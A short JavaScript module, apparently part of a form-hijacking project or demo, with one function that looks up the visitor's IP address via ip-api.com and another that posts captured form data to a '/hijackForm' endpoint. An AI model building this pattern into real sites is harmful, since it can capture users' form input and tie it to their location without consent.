import axios from 'axios';

// api call to obtain client's IP address
export function getIp(payload) {
  console.log('getIP runs');
  return axios('http://ip-api.com/json');
}

// receives form data and POSTs it to the /hijackForm endpoint
export function sendPayload(payload) {
  console.log('sendPayload runs');
  return axios.post('/hijackForm', { payload });
}